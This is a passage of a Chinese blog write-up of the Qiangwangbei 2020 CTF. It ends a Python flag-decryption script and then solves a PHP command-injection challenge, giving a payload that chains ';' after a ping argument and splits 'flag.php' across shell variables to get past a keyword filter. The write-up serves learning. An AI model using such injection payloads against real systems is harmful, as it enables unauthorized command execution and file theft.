</span><span class=lnt>15
</span><span class=lnt>16
</span><span class=lnt>17
</span><span class=lnt>18
</span><span class=lnt>19
</span><span class=lnt>20
</span><span class=lnt>21
</span><span class=lnt>22
</span><span class=lnt>23
</span><span class=lnt>24
</span><span class=lnt>25
</span><span class=lnt>26
</span><span class=lnt>27
</span><span class=lnt>28
</span><span class=lnt>29
</span><span class=lnt>30
</span><span class=lnt>31
</span><span class=lnt>32
</span><span class=lnt>33
</span><span class=lnt>34
</span><span class=lnt>35
</span><span class=lnt>36
</span><span class=lnt>37
</span><span class=lnt>38
</span><span class=lnt>39
</span><span class=lnt>40
</span></code></pre></td><td class=lntd><pre class=chroma><code class=language-python data-lang=python><span class=kn>import</span> <span class=nn>struct</span>

<span class=k>def</span> <span class=nf>decrypt</span><span class=p>(</span><span class=n>data</span><span class=p>,</span> <span class=n>btime</span><span class=p>,</span> <span class=n>fn</span><span class=p>,</span> <span class=n>salt</span><span class=p>):</span>
    <span class=n>funcs</span> <span class=o>=</span> <span class=p>{</span>
        <span class=s2>&#34;0&#34;</span><span class=p>:</span> <span class=k>lambda</span> <span class=n>x</span><span class=p>,</span> <span class=n>y</span><span class=p>:</span> <span class=n>x</span> <span class=o>-</span> <span class=n>y</span><span class=p>,</span>
        <span class=s2>&#34;1&#34;</span><span class=p>:</span> <span class=k>lambda</span> <span class=n>x</span><span class=p>,</span> <span class=n>y</span><span class=p>:</span> <span class=n>x</span> <span class=o>+</span> <span class=n>y</span><span class=p>,</span>
        <span class=s2>&#34;2&#34;</span><span class=p>:</span> <span class=k>lambda</span> <span class=n>x</span><span class=p>,</span> <span class=n>y</span><span class=p>:</span> <span class=n>x</span> <span class=o>^</span> <span class=n>y</span>
    <span class=p>}</span>

    <span class=n>offset</span> <span class=o>=</span> <span class=p>{</span>
        <span class=s2>&#34;0&#34;</span><span class=p>:</span> <span class=mh>0xefffff</span><span class=p>,</span>
        <span class=s2>&#34;1&#34;</span><span class=p>:</span> <span class=mh>0xefffff</span><span class=p>,</span>
        <span class=s2>&#34;2&#34;</span><span class=p>:</span> <span class=mh>0xffffff</span><span class=p>,</span>
    <span class=p>}</span>

    <span class=n>t</span> <span class=o>=</span> <span class=n>struct</span><span class=o>.</span><span class=n>unpack</span><span class=p>(</span><span class=s2>&#34;&lt;i&#34;</span><span class=p>,</span> <span class=n>btime</span><span class=p>)[</span><span class=mi>0</span><span class=p>]</span>
    <span class=n>boffset</span> <span class=o>=</span> <span class=n>offset</span><span class=p>[</span><span class=n>fn</span><span class=o>.</span><span class=n>decode</span><span class=p>()]</span>
    <span class=n>t</span> <span class=o>-=</span> <span class=n>boffset</span>
    <span class=n>t</span> <span class=o>=</span> <span class=n>struct</span><span class=o>.</span><span class=n>pack</span><span class=p>(</span><span class=s2>&#34;&lt;i&#34;</span><span class=p>,</span> <span class=n>t</span><span class=p>)</span>

    <span class=n>i</span> <span class=o>=</span> <span class=mi>0</span>
    <span class=k>for</span> <span class=n>c</span> <span class=ow>in</span> <span class=n>data</span><span class=p>:</span>
        <span class=k>for</span> <span class=n>ss</span> <span class=ow>in</span> <span class=nb>range</span><span class=p>(</span><span class=mi>0</span><span class=p>,</span> <span class=mi>256</span><span class=p>):</span>
            <span class=k>if</span> <span class=p>(</span><span class=n>funcs</span><span class=p>[</span><span class=n>fn</span><span class=o>.</span><span class=n>decode</span><span class=p>()](</span><span class=n>ss</span> <span class=o>^</span> <span class=n>t</span><span class=p>[</span><span class=n>i</span><span class=p>],</span> <span class=n>salt</span><span class=p>)</span> <span class=o>%</span> <span class=mi>256</span><span class=p>)</span> <span class=o>==</span> <span class=n>c</span><span class=p>:</span>
                <span class=k>print</span><span class=p>(</span><span class=nb>chr</span><span class=p>(</span><span class=n>ss</span><span class=p>),</span> <span class=n>end</span><span class=o>=</span><span class=s1>&#39;&#39;</span><span class=p>)</span>
                <span class=k>break</span>
        <span class=n>i</span> <span class=o>=</span> <span class=p>(</span><span class=n>i</span> <span class=o>+</span> <span class=mi>1</span><span class=p>)</span> <span class=o>%</span> <span class=mi>4</span>

<span class=n>f</span> <span class=o>=</span> <span class=nb>open</span><span class=p>(</span><span class=s2>&#34;data.txt&#34;</span><span class=p>,</span> <span class=s2>&#34;r&#34;</span><span class=p>)</span>
<span class=n>readlines</span> <span class=o>=</span> <span class=n>f</span><span class=o>.</span><span class=n>readlines</span><span class=p>()</span>
<span class=n>f</span><span class=o>.</span><span class=n>close</span><span class=p>()</span>

<span class=k>for</span> <span class=n>i</span> <span class=ow>in</span> <span class=nb>range</span><span class=p>(</span><span class=mi>0</span><span class=p>,</span><span class=nb>len</span><span class=p>(</span><span class=n>readlines</span><span class=p>),</span><span class=mi>5</span><span class=p>):</span>
    <span class=n>data</span> <span class=o>=</span> <span class=n>readlines</span><span class=p>[</span><span class=n>i</span><span class=o>+</span><span class=mi>3</span><span class=p>]</span>
    <span class=n>btime</span> <span class=o>=</span> <span class=nb>bytes</span><span class=o>.</span><span class=n>fromhex</span><span class=p>(</span><span class=n>readlines</span><span class=p>[</span><span class=n>i</span><span class=o>+</span><span class=mi>1</span><span class=p>][:</span><span class=o>-</span><span class=mi>1</span><span class=p>])</span>
    <span class=n>fn</span> <span class=o>=</span> <span class=nb>bytes</span><span class=o>.</span><span class=n>fromhex</span><span class=p>(</span><span class=n>data</span><span class=p>[</span><span class=mi>16</span><span class=p>:</span><span class=mi>18</span><span class=p>])</span>
    <span class=n>salt</span> <span class=o>=</span> <span class=nb>ord</span><span class=p>(</span><span class=nb>bytes</span><span class=o>.</span><span class=n>fromhex</span><span class=p>(</span><span class=n>data</span><span class=p>[</span><span class=mi>18</span><span class=p>:</span><span class=mi>20</span><span class=p>]))</span>
    <span class=n>data</span> <span class=o>=</span> <span class=nb>bytes</span><span class=o>.</span><span class=n>fromhex</span><span class=p>(</span><span class=n>data</span><span class=p>[</span><span class=mi>20</span><span class=p>:</span><span class=o>-</span><span class=mi>1</span><span class=p>])</span>

    <span class=n>decrypt</span><span class=p>(</span><span class=n>data</span><span class=p>,</span> <span class=n>btime</span><span class=p>,</span> <span class=n>fn</span><span class=p>,</span> <span class=n>salt</span><span class=p>)</span>
</code></pre></td></tr></table></div></div><p>最后运行的结果如下， 把每一个字符提出来加上QWB{}就得到<code>flag</code>：</p><p><figure><a class=lightgallery href=/images/%e5%bc%ba%e7%bd%91%e6%9d%af2020%e9%83%a8%e5%88%86WriteUp/1b402a35c7594da7b2456ff54641a2db632676c2a1ca652e4ee36075430c58ed.png title=image-20200824030245817 data-thumbnail=/images/强网杯2020部分WriteUp/1b402a35c7594da7b2456ff54641a2db632676c2a1ca652e4ee36075430c58ed.png data-sub-html="<h2> </h2><p>image-20200824030245817</p>"><img class=lazyload src=/svg/loading.min.svg data-src=/images/%e5%bc%ba%e7%bd%91%e6%9d%af2020%e9%83%a8%e5%88%86WriteUp/1b402a35c7594da7b2456ff54641a2db632676c2a1ca652e4ee36075430c58ed.png data-srcset="/images/%e5%bc%ba%e7%bd%91%e6%9d%af2020%e9%83%a8%e5%88%86WriteUp/1b402a35c7594da7b2456ff54641a2db632676c2a1ca652e4ee36075430c58ed.png, /images/%e5%bc%ba%e7%bd%91%e6%9d%af2020%e9%83%a8%e5%88%86WriteUp/1b402a35c7594da7b2456ff54641a2db632676c2a1ca652e4ee36075430c58ed.png 1.5x, /images/%e5%bc%ba%e7%bd%91%e6%9d%af2020%e9%83%a8%e5%88%86WriteUp/1b402a35c7594da7b2456ff54641a2db632676c2a1ca652e4ee36075430c58ed.png 2x" data-sizes=auto alt=/images/强网杯2020部分WriteUp/1b402a35c7594da7b2456ff54641a2db632676c2a1ca652e4ee36075430c58ed.png></a><figcaption class=image-caption></figcaption></figure></p><hr><h2 id=强网先锋主动>强网先锋——主动</h2><p>打开链接得到源码：</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre class=chroma><code><span class=lnt> 1
</span><span class=lnt> 2
</span><span class=lnt> 3
</span><span class=lnt> 4
</span><span class=lnt> 5
</span><span class=lnt> 6
</span><span class=lnt> 7
</span><span class=lnt> 8
</span><span class=lnt> 9
</span><span class=lnt>10
</span><span class=lnt>11
</span></code></pre></td><td class=lntd><pre class=chroma><code class=language-php data-lang=php><span class=cp>&lt;?php</span>
<span class=nx>highlight_file</span><span class=p>(</span><span class=s2>&#34;index.php&#34;</span><span class=p>);</span>

<span class=k>if</span><span class=p>(</span><span class=nx>preg_match</span><span class=p>(</span><span class=s2>&#34;/flag/i&#34;</span><span class=p>,</span> <span class=nv>$_GET</span><span class=p>[</span><span class=s2>&#34;ip&#34;</span><span class=p>]))</span>
<span class=p>{</span>
    <span class=k>die</span><span class=p>(</span><span class=s2>&#34;no flag&#34;</span><span class=p>);</span>
<span class=p>}</span>

<span class=nx>system</span><span class=p>(</span><span class=s2>&#34;ping -c 3 </span><span class=si>$_GET[ip]</span><span class=s2>&#34;</span><span class=p>);</span>

<span class=cp>?&gt;</span> 
</code></pre></td></tr></table></div></div><p>很基础的命令执行，先查看当前目录下的文件：</p><p><figure><a class=lightgallery href=/images/%e5%bc%ba%e7%bd%91%e6%9d%af2020%e9%83%a8%e5%88%86WriteUp/380cda933f118e1dd80a444394e0cf88a57649039da7a1ea02dac4ded854de20.png title=image-20200823173950037 data-thumbnail=/images/强网杯2020部分WriteUp/380cda933f118e1dd80a444394e0cf88a57649039da7a1ea02dac4ded854de20.png data-sub-html="<h2> </h2><p>image-20200823173950037</p>"><img class=lazyload src=/svg/loading.min.svg data-src=/images/%e5%bc%ba%e7%bd%91%e6%9d%af2020%e9%83%a8%e5%88%86WriteUp/380cda933f118e1dd80a444394e0cf88a57649039da7a1ea02dac4ded854de20.png data-srcset="/images/%e5%bc%ba%e7%bd%91%e6%9d%af2020%e9%83%a8%e5%88%86WriteUp/380cda933f118e1dd80a444394e0cf88a57649039da7a1ea02dac4ded854de20.png, /images/%e5%bc%ba%e7%bd%91%e6%9d%af2020%e9%83%a8%e5%88%86WriteUp/380cda933f118e1dd80a444394e0cf88a57649039da7a1ea02dac4ded854de20.png 1.5x, /images/%e5%bc%ba%e7%bd%91%e6%9d%af2020%e9%83%a8%e5%88%86WriteUp/380cda933f118e1dd80a444394e0cf88a57649039da7a1ea02dac4ded854de20.png 2x" data-sizes=auto alt=/images/强网杯2020部分WriteUp/380cda933f118e1dd80a444394e0cf88a57649039da7a1ea02dac4ded854de20.png></a><figcaption class=image-caption></figcaption></figure></p><p>可看到<code>flag.php</code>在当前目录下，但是因为上面的正则表达式无法直接读取文件，这里利用 Linux 的变量机制来绕过正则：</p><p><figure><a class=lightgallery href=/images/%e5%bc%ba%e7%bd%91%e6%9d%af2020%e9%83%a8%e5%88%86WriteUp/31f01dcd8d0385902f362f288e72de2c5f9f4a6b9acee453e3e6c72291f73686.png title=image-20200823175004665 data-thumbnail=/images/强网杯2020部分WriteUp/31f01dcd8d0385902f362f288e72de2c5f9f4a6b9acee453e3e6c72291f73686.png data-sub-html="<h2> </h2><p>image-20200823175004665</p>"><img class=lazyload src=/svg/loading.min.svg data-src=/images/%e5%bc%ba%e7%bd%91%e6%9d%af2020%e9%83%a8%e5%88%86WriteUp/31f01dcd8d0385902f362f288e72de2c5f9f4a6b9acee453e3e6c72291f73686.png data-srcset="/images/%e5%bc%ba%e7%bd%91%e6%9d%af2020%e9%83%a8%e5%88%86WriteUp/31f01dcd8d0385902f362f288e72de2c5f9f4a6b9acee453e3e6c72291f73686.png, /images/%e5%bc%ba%e7%bd%91%e6%9d%af2020%e9%83%a8%e5%88%86WriteUp/31f01dcd8d0385902f362f288e72de2c5f9f4a6b9acee453e3e6c72291f73686.png 1.5x, /images/%e5%bc%ba%e7%bd%91%e6%9d%af2020%e9%83%a8%e5%88%86WriteUp/31f01dcd8d0385902f362f288e72de2c5f9f4a6b9acee453e3e6c72291f73686.png 2x" data-sizes=auto alt=/images/强网杯2020部分WriteUp/31f01dcd8d0385902f362f288e72de2c5f9f4a6b9acee453e3e6c72291f73686.png></a><figcaption class=image-caption></figcaption></figure></p><p>Payload：<code>?ip=8.8.8.8;a="fla";b="g.php";cat%20"./"$a$b</code></p><hr><div class="details admonition abstract open"><div class="details-summary admonition-title"><i class="icon fas fa-list-ul fa-fw"></i>链接<i class="details-icon fas fa-angle-right fa-fw"></i></div><div class=details-content><div class=admonition-content>相关题目：<a href=/others/%e5%bc%ba%e7%bd%91%e6%9d%af2020%e9%83%a8%e5%88%86WriteUp/%e5%bc%ba%e7%bd%91%e6%9d%af2020WriteUp%e7%9b%b8%e5%85%b3%e9%a2%98%e7%9b%ae.zip rel>强网杯2020WriteUp相关题目.zip</a></div></div></div></div><div class=post-footer id=post-footer><div class=post-info><div class=post-info-line><div class=post-info-mod><span>更新于 2020-08-25</span></div><div class=post-info-license></div></div><div class=post-info-line><div class=post-info-md></div><div class=post-info-share><span><a href=javascript:void(0); title="分享到 Twitter" data-sharer=twitter data-url=https://hstar.me/2020/08/qwb-2020-writeup/ data-title=强网杯2020部分WriteUp data-hashtags=强网杯><i class="fab fa-twitter fa-fw"></i></a><a href=javascript:void(0); title="分享到 Facebook" data-sharer=facebook data-url=https://hstar.me/2020/08/qwb-2020-writeup/ data-hashtag=强网杯><i class="fab fa-facebook-square fa-fw"></i></a><a href=javascript:void(0); title="分享到 WhatsApp" data-sharer=whatsapp data-url=https://hstar.me/2020/08/qwb-2020-writeup/ data-title=强网杯2020部分WriteUp data-web><i class="fab fa-whatsapp fa-fw"></i></a><a href=javascript:void(0); title="分享到 Line" data-sharer=line data-url=https://hstar.me/2020/08/qwb-2020-writeup/ data-title=强网杯2020部分WriteUp><i data-svg-src=/lib/simple-icons/icons/line.min.svg></i></a><a href=javascript:void(0); title="分享到 微博" data-sharer=weibo data-url=https://hstar.me/2020/08/qwb-2020-writeup/ data-title=强网杯2020部分WriteUp data-image=/images/强网杯2020部分WriteUp/532f01757c3ab45ade69b98f86a0086ad00f4c7b0b8549610ab912367a8c05dd.png><i class="fab fa-weibo fa-fw"></i></a><a href=javascript:void(0); title="分享到 Myspace" data-sharer=myspace data-url=https://hstar.me/2020/08/qwb-2020-writeup/ data-title=强网杯2020部分WriteUp data-description=强网杯2020><i data-svg-src=/lib/simple-icons/icons/myspace.min.svg></i></a><a href=javascript:void(0); title="分享到 Blogger" data-sharer=blogger data-url=https://hstar.me/2020/08/qwb-2020-writeup/ data-title=强网杯2020部分WriteUp data-description=强网杯2020><i class="fab fa-blogger fa-fw"></i></a><a href=javascript:void(0); title="分享到 Evernote" data-sharer=evernote data-url=https://hstar.me/2020/08/qwb-2020-writeup/ data-title=强网杯2020部分WriteUp><i class="fab fa-evernote fa-fw"></i></a></span></div></div></div><div class=post-info-more><section class=post-tags><i class="fas fa-tags fa-fw"></i>&nbsp;<a href=/tags/%E5%BC%BA%E7%BD%91%E6%9D%AF/>强网杯</a></section><section><span><a href=javascript:void(0); onclick=window.history.back();>返回</a></span>&nbsp;|&nbsp;<span><a href=/>主页</a></span></section></div><div class=post-nav><a href=/2020/08/hill-cipher-study/ class=prev rel=prev title=关于希尔密码的简单研究><i class="fas fa-angle-left fa-fw"></i>关于希尔密码的简单研究</a>
<a href=/2020/09/note-software-test/ class=next rel=next title=笔记软件测试>笔记软件测试<i class="fas fa-angle-right fa-fw"></i></a></div></div><div id=comments><div id=valine class=comment></div><noscript>Please enable JavaScript to view the comments powered by <a href=https://valine.js.org/>Valine</a>.</noscript></div></article></div></main><footer class=footer><div class=footer-container><div class=footer-line>由 <a href=https://gohugo.io/ target=_blank rel="noopener noreffer" title="Hugo 0.68.3">Hugo</a> 强力驱动 | 主题 - <a href=https://github.com/dillonzq/LoveIt target=_blank rel="noopener noreffer" title="LoveIt 0.2.10"><i class="far fa-kiss-wink-heart fa-fw"></i>LoveIt</a></div><div class=footer-line><i class="far fa-copyright fa-fw"></i><span itemprop=copyrightYear>2019 - 2020</span><span class=author itemprop=copyrightHolder>&nbsp;<a href=/about/ target=_blank>HStar</a></span>&nbsp;|&nbsp;<span class=license><a rel="license external nofollow noopener noreffer" href=https://creativecommons.org/licenses/by-nc/4.0/ target=_blank>CC BY-NC 4.0</a></span></div></div></footer></div><div id=fixed-buttons><a href=# id=back-to-top class=fixed-button title=回到顶部><i class="fas fa-arrow-up fa-fw"></i></a><a href=# id=view-comments class=fixed-button title=查看评论><i class="fas fa-comment fa-fw"></i></a></div><link rel=stylesheet href=/lib/valine/valine.min.css><link rel=stylesheet href=/lib/lightgallery/lightgallery.min.css><link rel=stylesheet href=/lib/katex/katex.min.css><link rel=stylesheet href=/lib/katex/copy-tex.min.css><script type=text/javascript src=/lib/valine/Valine.min.js></script><script type=text/javascript src=/lib/smooth-scroll/smooth-scroll.min.js></script><script type=text/javascript src=/lib/autocomplete/autocomplete.min.js></script><script type=text/javascript src=/lib/lunr/lunr.min.js></script><script type=text/javascript src=/lib/lunr/lunr.stemmer.support.min.js></script><script type=text/javascript src=/lib/lunr/lunr.zh.min.js></script><script type=text/javascript src=/lib/lazysizes/lazysizes.min.js></script><script type=text/javascript src=/lib/lightgallery/lightgallery.min.js></script><script type=text/javascript src=/lib/lightgallery/lg-thumbnail.min.js></script><script type=text/javascript src=/lib/lightgallery/lg-zoom.min.js></script><script type=text/javascript src=/lib/clipboard/clipboard.min.js></script><script type=text/javascript src=/lib/sharer/sharer.min.js></script><script type=text/javascript src=/lib/katex/katex.min.js></script><script type=text/javascript src=/lib/katex/auto-render.min.js></script><script type=text/javascript src=/lib/katex/copy-tex.min.js></script><script type=text/javascript src=/lib/katex/mhchem.min.js></script><script type=text/javascript>window.config={"code":{"copyTitle":"复制到剪贴板","maxShownLines":50},"comment":{"valine":{"appId":"EjHP7h8csVSDkWTeUAebIYYQ-MdYXbMMI","appKey":"twlb57KBtNWNBgPyyVHX3tAQ","avatar":"mp","el":"#valine","emojiCDN":"https://cdn.jsdelivr.net/npm/emoji-datasource-google@5.0.1/img/google/64/","emojiMaps":{"100":"1f4af.png","alien":"1f47d.png","anger":"1f4a2.png","angry":"1f620.png","anguished":"1f627.png","astonished":"1f632.png","black_heart":"1f5a4.png","blue_heart":"1f499.png","blush":"1f60a.png","bomb":"1f4a3.png","boom":"1f4a5.png","broken_heart":"1f494.png","brown_heart":"1f90e.png","clown_face":"1f921.png","cold_face":"1f976.png","cold_sweat":"1f630.png","confounded":"1f616.png","confused":"1f615.png","cry":"1f622.png","crying_cat_face":"1f63f.png","cupid":"1f498.png","dash":"1f4a8.png","disappointed":"1f61e.png","disappointed_relieved":"1f625.png","dizzy":"1f4ab.png","dizzy_face":"1f635.png","drooling_face":"1f924.png","exploding_head":"1f92f.png","expressionless":"1f611.png","face_vomiting":"1f92e.png","face_with_cowboy_hat":"1f920.png","face_with_hand_over_mouth":"1f92d.png","face_with_head_bandage":"1f915.png","face_with_monocle":"1f9d0.png","face_with_raised_eyebrow":"1f928.png","face_with_rolling_eyes":"1f644.png","face_with_symbols_on_mouth":"1f92c.png","face_with_thermometer":"1f912.png","fearful":"1f628.png","flushed":"1f633.png","frowning":"1f626.png","ghost":"1f47b.png","gift_heart":"1f49d.png","green_heart":"1f49a.png","grimacing":"1f62c.png","grin":"1f601.png","grinning":"1f600.png","hankey":"1f4a9.png","hear_no_evil":"1f649.png","heart":"2764-fe0f.png","heart_decoration":"1f49f.png","heart_eyes":"1f60d.png","heart_eyes_cat":"1f63b.png","heartbeat":"1f493.png","heartpulse":"1f497.png","heavy_heart_exclamation_mark_ornament":"2763-fe0f.png","hole":"1f573-fe0f.png","hot_face":"1f975.png","hugging_face":"1f917.png","hushed":"1f62f.png","imp":"1f47f.png","innocent":"1f607.png","japanese_goblin":"1f47a.png","japanese_ogre":"1f479.png","joy":"1f602.png","joy_cat":"1f639.png","kiss":"1f48b.png","kissing":"1f617.png","kissing_cat":"1f63d.png","kissing_closed_eyes":"1f61a.png","kissing_heart":"1f618.png","kissing_smiling_eyes":"1f619.png","laughing":"1f606.png","left_speech_bubble":"1f5e8-fe0f.png","love_letter":"1f48c.png","lying_face":"1f925.png","mask":"1f637.png","money_mouth_face":"1f911.png","nauseated_face":"1f922.png","nerd_face":"1f913.png","neutral_face":"1f610.png","no_mouth":"1f636.png","open_mouth":"1f62e.png","orange_heart":"1f9e1.png","partying_face":"1f973.png","pensive":"1f614.png","persevere":"1f623.png","pleading_face":"1f97a.png","pouting_cat":"1f63e.png","purple_heart":"1f49c.png","rage":"1f621.png","relaxed":"263a-fe0f.png","relieved":"1f60c.png","revolving_hearts":"1f49e.png","right_anger_bubble":"1f5ef-fe0f.png","robot_face":"1f916.png","rolling_on_the_floor_laughing":"1f923.png","scream":"1f631.png","scream_cat":"1f640.png","see_no_evil":"1f648.png","shushing_face":"1f92b.png","skull":"1f480.png","skull_and_crossbones":"2620-fe0f.png","sleeping":"1f634.png","sleepy":"1f62a.png","slightly_frowning_face":"1f641.png","slightly_smiling_face":"1f642.png","smile":"1f604.png","smile_cat":"1f638.png","smiley":"1f603.png","smiley_cat":"1f63a.png","smiling_face_with_3_hearts":"1f970.png","smiling_imp":"1f608.png","smirk":"1f60f.png","smirk_cat":"1f63c.png","sneezing_face":"1f927.png","sob":"1f62d.png","space_invader":"1f47e.png","sparkling_heart":"1f496.png","speak_no_evil":"1f64a.png","speech_balloon":"1f4ac.png","star-struck":"1f929.png","stuck_out_tongue":"1f61b.png","stuck_out_tongue_closed_eyes":"1f61d.png","stuck_out_tongue_winking_eye":"1f61c.png","sunglasses":"1f60e.png","sweat":"1f613.png","sweat_drops":"1f4a6.png","sweat_smile":"1f605.png","thinking_face":"1f914.png","thought_balloon":"1f4ad.png","tired_face":"1f62b.png","triumph":"1f624.png","two_hearts":"1f495.png","unamused":"1f612.png","upside_down_face":"1f643.png","weary":"1f629.png","white_frowning_face":"2639-fe0f.png","white_heart":"1f90d.png","wink":"1f609.png","woozy_face":"1f974.png","worried":"1f61f.png","yawning_face":"1f971.png","yellow_heart":"1f49b.png","yum":"1f60b.png","zany_face":"1f92a.png","zipper_mouth_face":"1f910.png","zzz":"1f4a4.png"},"enableQQ":false,"highlight":true,"lang":"zh-cn","pageSize":10,"placeholder":"你的评论 ...","recordIP":true,"serverURLs":"https://leancloud.hstar.me","visitor":true}},"lightGallery":{"actualSize":false,"exThumbImage":"data-thumbnail","hideBarsDelay":2000,"selector":".lightgallery","speed":400,"thumbContHeight":80,"thumbWidth":80,"thumbnail":true},"math":{"delimiters":[{"display":true,"left":"$$","right":"$$"},{"display":true,"left":"\\[","right":"\\]"},{"display":false,"left":"$","right":"$"},{"display":false,"left":"\\(","right":"\\)"}],"strict":false},"search":{"highlightTag":"em","lunrIndexURL":"/index.json","lunrLanguageCode":"zh","lunrSegmentitURL":"/lib/lunr/lunr.segmentit.js","maxResultLength":10,"noResultsFound":"没有找到结果","snippetLength":50,"type":"lunr"}};</script><script type=text/javascript src=/js/theme.min.js></script></body></html>